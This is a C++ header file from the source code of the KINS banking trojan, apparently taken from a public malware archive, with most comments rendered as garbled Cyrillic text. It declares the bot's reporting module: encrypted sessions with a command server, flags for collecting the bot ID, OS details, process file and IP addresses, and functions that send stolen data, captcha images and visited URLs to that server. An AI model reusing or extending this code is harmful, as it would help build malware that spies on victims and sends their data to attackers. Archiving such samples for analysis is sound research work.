/*
  name      KINS
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
/*
  ���� � �������� �������.
*/
#pragma once

#include "..\common\crypt.h"
#include "..\common\binstorage.h"
#include "..\common\threadsgroup.h"

namespace Report
{
  typedef struct _SERVERSESSION
  {
    LPSTR url; //URL �������.

    /*
      ������� ���������� ��� ������������ �������.

      IN loop    - ����� ������� ��� �������� ����������.
      IN session - ������ ������ �������� � StartServerSession. �� pSession->pPostData - �����
                   ��������� ����� ������������� pSession->pPostData, ������� �� ������ ��������
                   �������� ������ ���� �������, ��� ��������� ����� ���������� ����� �����
                   ���������� �������. ��������� ������� BinStorage::_pack ������.

      Return     - SSPR_*
    */
    typedef int (*REQUESTPROC)(DWORD loop, _SERVERSESSION *session);
    REQUESTPROC requestProc;

    /*
      ������� ���������� ��� ��������� ���������� ������� (������ �������). ���������� ������ �
      ������ ��������� ���������� BinStorage::_unpack ��� ������ �������.

      IN loop    - ����� ������� ��� �������� ����������.
      IN session - ������ ������ �������� � StartServerSession. �� pSession->pPostData - �����
                   ��������� ����� ������� (��� ����������� BinStorage::_unpack). ��������� �����
                   ��������� ����� ����� ������ �� ���� �������.

      Return     - SSPR_*
    */
    typedef int (*RESULTPROC)(DWORD loop, _SERVERSESSION *session);
    RESULTPROC resultProc;

    HANDLE stopEvent; //������ ����������.

    //������ � ����� ���������� ��� pPostData. ���� �� ����� ������� � ���� ��������� ��������.
    Crypt::RC4KEY *rc4Key;

    BinStorage::STORAGE *postData; //���� ������ ��� �������. ��� �������� �� _Run ����� ���� ��� NULL,
                                   //��� ��� � ���������. �� �� ����� BinStorage::_pack!

    void *customData; //��������������� ������ ��� ������� �������.
  }SERVERSESSION;

  //���� ������ ��� REQUESTPROC.
  enum
  {
    SSPR_CONTUNUE, //���������� �����������.
    SSPR_END,      //������ ���������.
    SSPR_ERROR     //������ ��������� � �������.
  };

  //�������� ���� ���������� ��� ���������� � ���.
  enum
  {
    BIF_BOT_ID       = 0x01, //���������� BOTID � ������.
    BIF_BOT_VERSION  = 0x02, //���������� ������ ����.
    BIF_TIME_INFO    = 0x04, //���������� ������ � �������.
    BIF_OS           = 0x08, //���������� ���������� �� OS.
    BIF_PROCESS_FILE = 0x10, //���� ��������.
    BIF_IP_ADDRESSES = 0x20, //������ IP-�������.
  };

  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    ���������� ������� ���������� � �����.

    IN OUT binStorage - �����������(�����). ���� �� ����� *pph == NULL, �� ������� ������� �����
                        ������������
    IN flags          - ����� BIF_*.

    Return            - true - � ������ ������, 
                        false - � ������ ������.
  */
  bool addBasicInfo(BinStorage::STORAGE **binStorage, DWORD flags);

  /*
    ������ ������ � ��������.

    IN session - ������. 

    Return     - true - � ������ ��������� ���������� ������ (����������, ������������ �������,
                 �������� SSPR_END �� *_PROC)
                 false - � ����� ������ ������.
  */
  bool startServerSession(SERVERSESSION *session);

  // Send data to server
  bool writeData(DWORD type, LPWSTR sourcePath, void *data, DWORD dataSize);

  bool writeIStream(DWORD type, LPWSTR sourcePath, IStream *data);
  
  // Send string to server
  bool writeString(DWORD type, LPWSTR sourcePath, LPWSTR string, DWORD stringSize);
  
  /*
    Send captcha file to server.

    IN path     - captcha file name.
    IN data     - captcha data.
    IN dataSize - captcha data size.

    Return      - true - success
                  false - failure
  */
  bool writeCaptcha(LPWSTR path, void *data, DWORD dataSize);

  /*
	Send notification to server about visited URL.

	IN url - URL that triggered notification.
  */
  void sendNotification(LPSTR url);
};
